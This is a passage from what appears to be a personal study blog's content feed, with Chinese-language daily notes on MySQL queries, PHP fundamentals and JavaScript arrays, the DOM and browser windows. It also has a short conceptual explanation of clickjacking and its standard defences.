表名 engine=存储引擎名;给所有字段增加数据:insert into users (字段名1,字段名2,字段名3)values(值1,值2,值3);【插入顺序】first    alter table 表名 add 字段(字段类型) firstafter    alter table 表名 add 字段名(字段类型) after (在谁后面)【其它命令】显示系统特定资源的信息show status;                   //例如，正在运行的线程数量。</code></pre><h4 id="mysql数据类型"><a href="#mysql数据类型" class="headerlink" title="mysql数据类型"></a>mysql数据类型</h4><p>整形:<br>int4字节，bigint8字节<br>浮点型:<br>float(m,d)<br>double(m,d)<br>decimal(m,d)<br>字符型:<br>char定长字符串(常用于32位md5密码)<br>varchar变长字符串(常用于用户名)<br>时间型:<br>4字节，年月日格式<br>auto_increment:<br>自动增加，只用于整形，priimary&emsp;key设置起始值(默认为1)<br><a href="https://www.cnblogs.com/-xlp/p/8617760.html">总结内容</a></p><h5 id="以上内容皆可使用phpMyAdmin和NavicatPremium更改"><a href="#以上内容皆可使用phpMyAdmin和NavicatPremium更改" class="headerlink" title="以上内容皆可使用phpMyAdmin和NavicatPremium更改"></a>以上内容皆可使用phpMyAdmin和NavicatPremium更改</h5><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><pre><code>普通索引:alter table 表名 add index(字段);唯一索引:alter table 表名 add unique(字段);主键索引:alter table 表名 add primary key(字段);全文索引:alter table 表名 add fulltext(字段);显示索引:show index from 字段名</code></pre><p><a href="https://blog.csdn.net/qq_35190492/article/details/109257302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166808686716782428672275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166808686716782428672275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-109257302-null-null.142%5Ev63%5Ejs_top,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=mysql%E7%B4%A2%E5%BC%95&spm=1018.2226.3001.4187">使用及区别</a></p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><pre><code>select选择时如果要限制条件就在后面加上where和条件where age&lt;&gt;50; == where age!50                     //取非age in(18,16,17);                                  //固定查询的值address like &#39;Ax&#39;;                                 //模糊查询A开头的address like &#39;xAx&#39;;                                //模糊查询含A的select * from 表名 order by 列名 desc;             //降序显示，默认为升序(asc)select * from 表名 limit 5,5;                      //从第五个值开始往下取5个值select * from 表名 group by 列名;                  //分组(只保留一个，去重)select count(*) from 表名;                         //显示该列有几个数据select 列名 as 别名 from 表名;                     //给该列起别名注意:and优先级高于or，因此先计算and表达式再运算or表达式聚合查询:count()返回行数sum()返回某列值的和avg()返回某列平均值max()返回某列最大值min()返回某列最小值分组查询:select * from 表名 group by 字段名;select * from 表名 limit 开始行数,结束行数;select * from 表名 as 重命名;mysql子查询:类似于嵌套循环，将内层的结果传递到外层进行下一步操作大致有:where,from,exists三个联合查询(两个表的查询):原理——————取得两个结果集的并集union默认选取不同的值。如果允许重复的值，请使用union all(不会去掉结果中的重复行)union all 查询全部而且不会消除重复的行</code></pre><h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><pre><code>内联查询:select 列名1 from 表名1 inner join 表名2 on 条件;左连接查询(以左边为基准):select 列名1 from 表名1 left join 表名2 on 条件;右链接查询(左边没有的不会显示):select 列名1 from 表名1 right join 表名2 on 条件;嵌套查询:不建议，太慢</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog"><a href="#双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog" class="headerlink" title="双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)"></a>双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础（1）</title>
      <link href="/2022/11/10/20221110/"/>
      <url>/2022/11/10/20221110/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="开始学习PHP"><a href="#开始学习PHP" class="headerlink" title="开始学习PHP"></a>开始学习PHP</h5><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>PHP是超文本预处理器<br>运行在服务器端，内嵌在html脚本语言<br>由wampserver等集成环境，有mysql数据库和apache服务<br>使用localhost或127.0.0.1访问<br>写入的php文件一定要放在www目录下</p><h4 id="php信息"><a href="#php信息" class="headerlink" title="php信息"></a>php信息</h4><p>phpinfo();显示所有php的信息<br>php.ini配置文件</p><h4 id="PHP文件格式"><a href="#PHP文件格式" class="headerlink" title="PHP文件格式"></a>PHP文件格式</h4><pre><code>&lt;?php              //大小写都可以代码部分除最后一行以外每行结尾都要以;结尾?&gt;可以不写php但是要改ini配置文件的short_open_tag=On,要重启</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>$变量名(不能是数字或特殊符号开头，可以是中文，建议驼峰命名法)=’value’;<br>echo “$变量名”;        //输出上面传入的值</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><pre><code>单引号:如果里面有变量都作为一个字符串处理双引号:里面有变量会输出变量的值尽量使用单引号————效率高//单行注释/* */多行注释&quot;\n&quot;换行(双引号解释转义字符，单引号不解释)\r和\t同上&#39;\\&#39;时输出\&#39;\&#39;&#39;时输出&#39;因为\将后面的转义成没意义的字符变量和字符串之间用.连接，而且要&#39;将字符串包起来双引号中插入单引号，单引号再插入变量时，变量会解析成&#39;value&#39;双引号中插入变量时在变量后面加空格或,echo __FILE__;输出文件地址echo __LINE__;输出行号echo __DIR__;输出当前文件的文件夹的路径echo PHP_VERSION;获取php版本号echo __FUNCTION__;输出函数名false的情况:空字符串，0，空数组，null</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>&lt;分类&gt;标量    浮点类型:float    整数型:int    布尔型:boolean    字符串:string(只要是引号包起来的)混合类型    数组:array    对象:object特殊类型    空:null     资源:resourse    &lt;转换&gt;intval()转整形floatval()转浮点型strval()转字符串boolval()转布尔型&lt;注&gt;空转整形为0空转浮点型变成浮点型的0空转字符串变成空字符串整形后面有字符串会清除字符串保留前面的数字浮点型后面有字符串会清除字符串保留前面的全部数字&lt;判断&gt;is_array();is_string()is_bool();is_float();is_int();is_object();is_numeric();is_resource();is_null();is_scalar();判断标量gettype();只获取类型var_dump();输出值和类型PHP中提供四种整形的定义方式，十进制定义，二进制定义，八进制定义和十六进制定义$a = 120 //十进制$a = 0b110 //二进制$a = 0120     //八进制$a = 0x120    //十六进制// 使用echo输出时。默认输出为十进制decbin() // 十进制转二进制decoct() // 十进制转八进制dechex() // 十进制转十六进制bindec() // 二进制转十进制bin2hex() //二进制转十六进制    字符串：字符串变量用于存储并处理文本。</code></pre><h4 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h4><p>定义:<br>define(‘常量名字’,’常量值————必须是常量’);<br>变量可重新定义，使用的变量必须在上面定义<br>defind(A);判断A是否已经被定义了</p><pre><code>使用 define() 函数设置常量:bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )　　该函数有三个参数:name：必选参数，常量名称，即标志符。value：必选参数，常量的值。case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。&lt;?php // 常量define(&quot;CL&quot;, &quot;这是一个全局常量&quot;, true);echo CL; // 默认false，变量名区分大小写echo cl; // true不区分大小写?&gt;预定义常量PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。（1）__FILE__(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。（2）__LINE__(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。（3）PHP_VERSION：当前PHP预处理器的版本，如5.4.16。（4）PHP_OS: PHP所在的操作系统的类型。如Linux。（5）TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。（6）DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</code></pre><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><pre><code>算术运算符:+   -   *   /   %赋值运算符:=   +=   -=   /+   %=   .=自增自减运算符:++   --   比较运算符:&lt;   &gt;   &gt;=   &lt;=   ==   ===   !=(仅看值)   !==(看值和数据类型)   &lt;&gt;(相当于!=)逻辑运算符:&amp;&amp;   ||   !(真假反转)静态变量:static 放在函数体内，只会初始化一次变量，以后运行会记录上一次的值预递增++x         //先加再返回预递减--x         //先减再返回后递增x++         //先返回再加后递减x--         //先返回再减非!               //不是true就返回true或or/||           //一个true就true与and/&amp;&amp;          //都true才true异或xor           //有且仅有一个true才是true三元运算符:(expr1) ? (expr2) : (expr3)</code></pre><h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><pre><code>&lt;单分支&gt;if (条件) &#123;         //真区间;&#125; else &#123;         //假区间;&#125;后续代码;&lt;多分支&gt;switch (条件) &#123;    case 判断条件1 :    case 判断条件2 :    case 判断条件3 :        echo 执行1 ;        break;    case 判断条件4 :        echo 执行2 ;        break;    default:        echo 执行3 ;      //否则        break;&#125;if (条件判断1) &#123;    echo 执行1 ;&#125; else if (条件判断2) &#123;    echo 执行2 ;&#125; else if (条件判断3) &#123;    echo 执行3 ;&#125; else &#123;    echo 执行4 ;&#125;</code></pre><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><pre><code>for (初始条件;条件判断;执行A) &#123;       //程序进行从初始条件开始逆时针    echo 执行B ;&#125;——————————————————————————————————————————————————————————————————————————————while (条件判断) &#123;    echo 执行 ;&#125;——————————————————————————————————————————————————————————————————————————————do &#123;    echo 执行 ;&#125; while (条件判断);     //成立才接着循环——————————————————————————————————————————————————————————————————————————————continue从下一次循环语句开始break终止循环语句</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><pre><code>function 函数名 (设置参数$...=...) &#123;    echo 执行;    return 1;       //只返回不输出&#125;函数名 ();上面这样return的1是不会输出的，要输出就要在调用函数前echo函数可以在任何位置调用，但是变量不能在上面调用函数可以调用多次函数体内声明的变量是局部变量，否则是全局变量两者互不污染，同时局部变量与垃圾回收机制有关$_GET $_POST $_COOKIE $_SESSION $GLOBALS  超全局变量(统一内外变量)约束形参:function sum (int $num1 , int $num2)&#123;    return $num1 + $num2;&#125;(sum(&#39;2.3&#39;,3));约束返回值:function sum (int $num1 , int $num2):string&#123;    return $num1 + $num2;&#125;(sum(4,5));php7.0新特性:使用  ...$函数名  来将数组里的值一一给形参赋值匿名函数:将一个没有函数名的函数赋值给一个变量并调用(就是没有名字的函数)static的关键字的使用: * 当一个函数完成时，它的所有变量通常都会被删除。 * 然而，有时候您希望某个局部变量不要被删除。 * 要做到这一点，请在您第一次声明变量时使用 static 关键字：function test()&#123;    static $n=0;    $n++;    echo &quot;调用了一次&quot;.$n.&quot;\n&quot;;&#125;test();test();test();?&gt;</code></pre><h4 id="PHP变量作用域"><a href="#PHP变量作用域" class="headerlink" title="PHP变量作用域"></a>PHP变量作用域</h4><p>PHP 有三种不同的变量作用域：<br>local（局部）:函数内部声明的变量只能在函数内部进行访问<br>global（全局）:函数之外声明的变量只能在函数以外进行访问<br>static（静态）:静态变量仅在局部函数域中存在，当函数执行离开此作用域时，其值不会消失(例如拿来判断循环退出的变量)<br>内部函数想要引用外部变量可以引入global关键字global $outer;<br>注释：static变量仍然是函数的局部变量</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>查手册</p><h4 id="书写建议"><a href="#书写建议" class="headerlink" title="书写建议"></a>书写建议</h4><p>能加空格就加</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="幸运的人一生被童年治愈，不幸的人用一生治愈童年。"><a href="#幸运的人一生被童年治愈，不幸的人用一生治愈童年。" class="headerlink" title="幸运的人一生被童年治愈，不幸的人用一生治愈童年。"></a>幸运的人一生被童年治愈，不幸的人用一生治愈童年。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript深入了解</title>
      <link href="/2022/11/09/20221109/"/>
      <url>/2022/11/09/20221109/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>递归:调用函数时调用自身<br>最大的嵌套调用次数（包括首次）被称为 递归深度。</p><p>两种思考方式:<br>1.迭代思路：使用 for 循环<br>2.递归思路：简化任务，调用自身</p><h4 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h4><p>堆和栈是cpu的两个部分，栈用于存储数据，堆<br>遵守先入后出原则，存入数据是压栈，放出数据叫弹栈POP(内存的数据不删除，但是放入回收站)<br>如果只入不出(没有return)就会栈溢出，导致程序错误<br>执行上下文和堆栈:<br>执行上下文是一个内部数据结构，它包含有关函数执行时的详细细节：当前控制流所在的位置，当前的变量，this 的值（此处我们不使用它），以及其它的一些内部细节。<br>一个函数调用仅具有一个与其相关联的执行上下文。</p><p>函数进行嵌套调用时:</p><pre><code>当前函数被暂停；1.与它关联的执行上下文被一个叫做 执行上下文堆栈 的特殊数据结构保存；2.执行嵌套调用；3.嵌套调用结束后，从堆栈中恢复之前的执行上下文，并从停止的位置恢复外部函数。</code></pre><h4 id="Rest-参数与-Spread-语法"><a href="#Rest-参数与-Spread-语法" class="headerlink" title="Rest 参数与 Spread 语法"></a>Rest 参数与 Spread 语法</h4><p>当我们在代码中看到 “…” 时，它要么是 rest 参数，要么是 spread 语法。<br>有一个简单的方法可以区分它们：<br>若 … 出现在函数参数列表的最后，那么它就是 rest 参数，它会把参数列表中剩余的参数收集到一个数组中。<br>若 … 出现在函数调用或类似的表达式中，那它就是 spread 语法，它会把一个数组展开为列表。<br>使用场景：<br>Rest 参数用于创建可接受任意数量参数的函数。<br>Spread 语法用于将数组传递给通常需要含有许多参数的函数。<br>我们可以使用这两种语法轻松地互相转换列表与参数数组。<br>旧式的 arguments（类数组且可迭代的对象）也依然能够帮助我们获取函数调用中的所有参数。</p><h4 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h4><p>通常，函数调用完成后，会将词法环境和其中的所有变量从内存中删除。因为现在没有任何对它们的引用了。与 JavaScript 中的任何其他对象一样，词法环境仅在可达时才会被保留在内存中。<br>但是，如果有一个嵌套的函数在函数结束后仍可达，则它将具有引用词法环境的[[Environment]] 属性。<br>如果在（外部）函数执行完成后，它的词法环境仍然可达。因此，此词法环境仍然有效。<br>若要删除则需要令词法环境对象变得不可达</p><h4 id="属性标志"><a href="#属性标志" class="headerlink" title="属性标志"></a>属性标志</h4><p>value<br>writable — 如果为 true，则值可以被修改，否则它是只可读的。<br>enumerable — 如果为 true，则会被在循环中列出，否则不会被列出。<br>configurable — 如果为 true，则此属性可以被删除，这些特性也可以被修改，否则不可以。</p><h4 id="浏览器环境，规格"><a href="#浏览器环境，规格" class="headerlink" title="浏览器环境，规格"></a>浏览器环境，规格</h4><p>能运行 JavaScript 的平台称为主机环境<br>包含DOM，BOM，JavaScript</p><pre><code>文档对象模型（DOM）将所有页面内容表示为可以修改的对象浏览器对象模型（BOM）表示由浏览器（主机环境）提供的用于处理文档（document）之外的所有内容的其他对象  例如:      navigator 对象提供了有关浏览器和操作系统的背景信息          navigator.userAgent —— 关于当前浏览器          navigator.platform —— 关于平台（有助于区分 Windows/Linux/Mac 等）      location 对象允许我们读取当前 URL，并且可以将浏览器重定向到新的 URL</code></pre><h4 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h4><p>概念:<br>DOM 将 HTML 表示为标签的树形结构。<br>每个树的节点都是一个对象。<br>标签被称为 元素节点（或者仅仅是元素），元素内的文本形成 文本节点，被标记为 ＃text。一个文本节点只包含一个字符串。它没有子项，并且总是树的叶子。</p><p>自动修正:<br>浏览器遇到格式不正确的 HTML，它会在形成 DOM 时自动更正它。</p><p>浏览器开发工具元素（Elements）选项卡:<br>Styles —— 我们可以看到按规则应用于当前元素的 CSS 规则，包括内建规则（灰色）。几乎所有内容都可以就地编辑，包括下面的方框的 dimension/margin/padding。<br>Computed —— 按属性查看应用于元素的 CSS：对于每个属性，我们可以都可以看到赋予它的规则（包括 CSS 继承等）。<br>Event Listeners —— 查看附加到 DOM 元素的事件侦听器（我们将在本教程的下一部分介绍它们）。</p><p>节点属性:</p><pre><code>每个 DOM 节点都属于一个特定的类。这些类形成层次结构（hierarchy）。完整的属性和方法集是继承的结果。主要的 DOM 节点属性有：nodeType    我们可以使用它来查看节点是文本节点还是元素节点。它具有一个数值型值（numeric value）：1 表示元素，3 表示文本节点，其他一些则代表其他节点类型。只读。nodeName/tagName    用于元素名，标签名（除了 XML 模式，都要大写）。对于非元素节点，nodeName 描述了它是什么。只读。innerHTML    元素的 HTML 内容。可以被修改。outerHTML    元素的完整 HTML。对 elem.outerHTML 的写入操作不会触及 elem 本身。而是在外部上下文中将其替换为新的 HTML。nodeValue/data    非元素节点（文本、注释）的内容。两者几乎一样，我们通常使用 data。可以被修改。textContent    元素内的文本：HTML 减去所有 &lt;tags&gt;。写入文本会将文本放入元素内，所有特殊字符和标签均被视为文本。可以安全地插入用户生成的文本，并防止不必要的 HTML 插入。hidden    当被设置为 true 时，执行与 CSS display:none 相同的事。DOM 节点还具有其他属性，具体有哪些属性则取决于它们的类。例如，&lt;input&gt; 元素（HTMLInputElement）支持 value，type，而 &lt;a&gt; 元素（HTMLAnchorElement）则支持 href 等。大多数标准 HTML 特性（attribute）都具有相应的 DOM 属性。</code></pre><h4 id="弹窗和-window-的方法"><a href="#弹窗和-window-的方法" class="headerlink" title="弹窗和 window 的方法"></a>弹窗和 window 的方法</h4><p>window.open(‘<a href="https://javascript.info/&#39;)%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E5%85%B7%E6%9C%89%E7%BB%99%E5%AE%9A">https://javascript.info/&#39;)打开一个具有给定</a> URL 的新窗口</p><pre><code>阻止弹窗:1.阻止除了用户触发的事件之外的弹窗// 弹窗被阻止window.open(&#39;https://javascript.info&#39;);// 弹窗被允许button.onclick = () =&gt; &#123;  window.open(&#39;https://javascript.info&#39;);&#125;;2.浏览器可以接受不同时间的延迟，超过这个时间则移除“信任”// 1 秒后打开弹窗setTimeout(() =&gt; window.open(&#39;http://google.com&#39;), 1000);</code></pre><h4 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h4><p>打开一个弹窗的语法是 window.open(url, name, params)<br>其中params是width=200,height=100<br>窗口功能<br>menubar（yes/no）—— 显示或隐藏新窗口的浏览器菜单。<br>toolbar（yes/no）—— 显示或隐藏新窗口的浏览器导航栏（后退，前进，重新加载等）。<br>location（yes/no）—— 显示或隐藏新窗口的 URL 字段。Firefox 和 IE 浏览器不允许默认隐藏它。<br>status（yes/no）—— 显示或隐藏状态栏。同样，大多数浏览器都强制显示它。<br>resizable（yes/no）—— 允许禁用新窗口大小调整。不建议使用。<br>scrollbars（yes/no）—— 允许禁用新窗口的滚动条。不建议使用。</p><h4 id="跨窗口通信"><a href="#跨窗口通信" class="headerlink" title="跨窗口通信"></a>跨窗口通信</h4><p>“同源（Same Origin）”策略(保护用户免遭信息盗窃)限制了窗口（window）和 frame 之间的相互访问。<br>如果两个 URL 具有相同的协议，域和端口，则称它们是“同源”的。<br>“同源”策略规定：<br>1.如果我们有对另外一个窗口的引用，并且该窗口是同源的，那么我们就具有对该窗口的全部访问权限。<br>2.否则，就无法访问该窗口中的任何东西。唯一的例外是 location：我们可以修改它（进而重定向用户）。但是我们无法读取 location（因此，我们无法看到用户当前所处的位置，也就不会泄漏任何信息）。</p><h4 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h4><p>原理:<br>1.访问者被恶意页面吸引<br>2.页面上有一个看起来无害的链接<br>3.放置了一个透明的iframe标签，通常通过 z-index 实现的<br>点击劫持是对点击事件，而非键盘事件<br>防御:<br>1.阻止因更改 beforeunload 事件处理程序中的 top.location 而引起的过渡————当 iframe 试图更改 top.location 时，访问者会收到一条消息，询问他们是否要离开页面<br>2.利用Sandbox 特性，添加sandbox=”allow-scripts allow-forms” 的 iframe。允许脚本和表单。但没有 allow-top-navigation，因此禁止更改 top.location 。<br>3.服务器端 header X-Frame-Options 可以允许或禁止在 frame 中显示页面。(副作用大)<br>4.具有 samesite 特性的 cookie 仅在网站是通过直接方式打开（而不是通过 frame 或其他方式）的情况下才发送到网站。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="落月随山隐，"><a href="#落月随山隐，" class="headerlink" title="落月随山隐，"></a>落月随山隐，</h5><h5 id="山随月落隐。"><a href="#山随月落隐。" class="headerlink" title="山随月落隐。"></a>山随月落隐。</h5><h5 id="月落山随隐，"><a href="#月落山随隐，" class="headerlink" title="月落山随隐，"></a>月落山随隐，</h5><h5 id="随月落山隐。"><a href="#随月落山隐。" class="headerlink" title="随月落山隐。"></a>随月落山隐。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript拓展（3）</title>
      <link href="/2022/11/08/20221108/"/>
      <url>/2022/11/08/20221108/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组（Array）能存储有序的集合</p><p>声明:</p><pre><code>let arr = new Array();let fruits = [&quot;Apple&quot;, &quot;Orange&quot;, &quot;Plum&quot;];重新定义就能更改value增加array只需要定义新位置fruits.length是元素的个数以逗号结尾</code></pre><p>查找:<br>fruits[fruits.length - 1]&lt;因为方括号中的索引是被按照其字面意思处理的&gt;<br>fruits.at(-1)<br>不能用fruits[-1]查找元素,结果是 undefined</p><p>更改:<br>push 在末端添加一个元素<br>pop 从末端取出并删除一个元素<br>unshift 在数组的首端添加元素<br>shift 取出队列首端的一个元素，整个队列往前移，这样原先排第二的元素现在排在了第一个<br>(push 和 unshift 方法都可以一次添加多个元素)<br>push/pop 方法运行的比较快，而 shift/unshift 比较慢</p><p>slice:<br>arr.slice([start], [end])<br>返回一个新数组，将所有从索引 start 到 end（不包括 end）的数组项复制到一个新的数组。start 和 end 都可以是负数，在这种情况下，从末尾计算索引</p><p>splice:<br>arr.splice(start[, deleteCount, elem1, …, elemN])<br>从索引 start 开始修改 arr：删除 deleteCount 个元素并在当前位置插入 elem1, …, elemN。最后返回被删除的元素所组成的数组</p><p>concat:<br>arr.concat(arg1, arg2…)<br>创建一个包含来自于 arr，然后是 arg1，arg2 的元素的新数组。<br>如果参数 argN 是一个数组，那么其中的所有元素都会被复制。否则，将复制参数本身。<br>如果类数组对象具有 Symbol.isConcatSpreadable 属性，那么它的元素就会被添加</p><p>遍历:<br>for..of 不能获取当前元素的索引，只是获取元素值<br>for..in 会遍历所有属性，不仅仅是数字属性，而且不适用于数组，因此速度要慢<br>forEach 允许为数组的每个元素都运行一个函数</p><p>关于 “length”:<br>不是数组里元素的个数，而是最大的数字索引值加一<br>通过减少length来截断数组，但length恢复后数组不会恢复<br>清空数组最简单的方法就是：arr.length = 0;</p><p>new Array():<br>创建一个指定了长度，却没有任何项的数组</p><p>多维数组:<br>matrix[1][1]最中间的那个数</p><p>toString:<br>返回以逗号隔开的元素列表</p><p>使用 == 比较数组:<br>1.仅当两个对象引用的是同一个对象时，它们才相等 ==<br>2.如果 == 左右两个参数之中有一个参数是对象，另一个参数是原始类型，那么该对象将会被转换为原始类型<br>3.……null 和 undefined 相等 ==，且各自不等于任何其他的值</p><p>在数组中搜索:<br>arr.indexOf(item, from);<br>从索引 from 开始搜索 item，如果找到则返回索引，否则返回 -1。<br>arr.includes(item, from);<br>从索引 from 开始搜索 item，如果找到则返回 true（没找到则返回 false）。<br>alert( fruits.lastIndexOf(‘Apple’) );<br>与 indexOf 相同，但从右向左查找<br>arr.find(function(item, index, array);<br>item 是元素。index 是它的索引。array 是数组本身。<br>如果返回 true，则返回 item 并停止迭代;对于假值，则返回 undefined<br>arr.filter(function(item, index, array);<br>如果 true item 被 push 到 results，迭代继续;如果什么都没找到，则返回空数组<br>indexOf 和 includes 使用严格相等 === 进行比较。所以，搜索 false时会准确找到 false 而不是数字 0<br>includes可以正确处理 NaN</p><p>转换数组:<br>arr.map(function(item, index, array)<br>对数组的每个元素都调用函数，并返回结果数组<br>arr.sort();<br>默认情况下被按字符串进行排序<br>arr.sort(compareNumeric);<br>按数字进行排序<br>arr.reverse();<br>倒序</p><p>分割粘合数组:<br>let arr = names.split(‘, ‘,2);<br>将字符串分割成一个个数组,限制数组长度为2,额外的元素会被忽略<br>str.split(‘’);<br>将字符串拆分为字母数组<br>arr.join(‘;’);<br>根据;粘合数组</p><p>从数组中区分出普通对象:<br>Array.isArray({})<br>如果 value 是一个数组，则返回 true；否则返回 false。</p><h4 id="Iterable-object（可迭代对象）"><a href="#Iterable-object（可迭代对象）" class="headerlink" title="Iterable object（可迭代对象）"></a>Iterable object（可迭代对象）</h4><p>可以应用 for..of 的对象被称为 可迭代的。<br>技术上来说，可迭代对象必须实现 Symbol.iterator 方法。<br>obj[Symbol.iterator].() 的结果被称为迭代器（iterator）。由它处理进一步的迭代过程。<br>一个迭代器必须有 next() 方法，它返回一个 {done: Boolean, value: any} 对象，这里 done:true 表明迭代结束，否则 value 就是下一个值。<br>Symbol.iterator 方法会被 for..of 自动调用，但我们也可以直接调用它。<br>内建的可迭代对象例如字符串和数组，都实现了 Symbol.iterator。<br>字符串迭代器能够识别代理对。<br>有索引属性和 length 属性的对象被称为 类数组对象。这种对象可能还具有其他属性和方法，但是没有数组的内建方法。<br>如果我们仔细研究一下规范 —— 就会发现大多数内建方法都假设它们需要处理的是可迭代对象或者类数组对象，而不是“真正的”数组，因为这样抽象度更高。<br>Array.from(obj[, mapFn, thisArg]) 将可迭代对象或类数组对象 obj 转化为真正的数组 Array，然后我们就可以对它应用数组的方法。可选参数 mapFn 和 thisArg 允许我们将函数应用到每个元素。</p><h4 id="Map-and-Set（映射和集合）"><a href="#Map-and-Set（映射和集合）" class="headerlink" title="Map and Set（映射和集合）"></a>Map and Set（映射和集合）</h4><p>Map 是一个带键的数据项的集合，就像一个 Object 一样。 但是它们最大的差别是 Map 允许任何类型的键（key）。</p><pre><code>Mapnew Map() —— 创建 map。map.set(key, value) —— 根据键存储值。map.get(key) —— 根据键来返回值，如果 map 中不存在对应的 key，则返回 undefined。map.has(key) —— 如果 key 存在则返回 true，否则返回 false。map.delete(key) —— 删除指定键的值。map.clear() —— 清空 map。map.size —— 返回当前元素个数。Map 迭代map.keys() —— 遍历并返回一个包含所有键的可迭代对象，map.values() —— 遍历并返回一个包含所有值的可迭代对象，map.entries() —— 遍历并返回一个包含所有实体 [key, value] 的可迭代对象，for..of 在默认情况下使用的就是这个。</code></pre><p>Object.entries：从对象创建 Map<br>let map = new Map(Object.entries(obj));<br>Object.fromEntries：从 Map 创建对象<br>let obj = Object.fromEntries(map.entries()); // 创建一个普通对象（plain object）(*)</p><pre><code>Setnew Set(iterable) —— 创建一个 set，如果提供了一个 iterable 对象（通常是数组），将会从数组里面复制值到 set 中。set.add(value) —— 添加一个值，返回 set 本身set.delete(value) —— 删除值，如果 value 在这个方法调用的时候存在则返回 true ，否则返回 false。set.has(value) —— 如果 value 在 set 中，返回 true，否则返回 false。set.clear() —— 清空 set。set.size —— 返回元素个数。Set 迭代（iteration）set.keys() —— 遍历并返回一个包含所有值的可迭代对象，set.values() —— 与 set.keys() 作用相同，这是为了兼容 Map，set.entries() —— 遍历并返回一个包含所有的实体 [value, value] 的可迭代对象，它的存在也是为了兼容 Map。</code></pre><h4 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h4><p>WeakMap 是类似于 Map 的集合，它仅允许对象作为键，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象与其关联值一同删除。</p><p>WeakSet 是类似于 Set 的集合，它仅存储对象，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象删除。</p><p>它们的主要优点是它们对对象是弱引用，所以被它们引用的对象很容易地被垃圾收集器移除。</p><p>这是以不支持 clear、size、keys、values 等作为代价换来的……</p><p>WeakMap 和 WeakSet 被用作“主要”对象存储之外的“辅助”数据结构。一旦将对象从主存储器中删除，如果该对象仅被用作 WeakMap 或 WeakSet 的键，那么该对象将被自动清除。</p><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>JSON 是一种数据格式，具有自己的独立标准和大多数编程语言的库。<br>JSON 支持 object，array，string，number，boolean 和 null。<br>JavaScript 提供序列化（serialize）成 JSON 的方法 JSON.stringify 和解析 JSON 的方法 JSON.parse。<br>这两种方法都支持用于智能读/写的转换函数。<br>如果一个对象具有 toJSON，那么它会被 JSON.stringify 调用。</p><h3 id="每日一句"><a 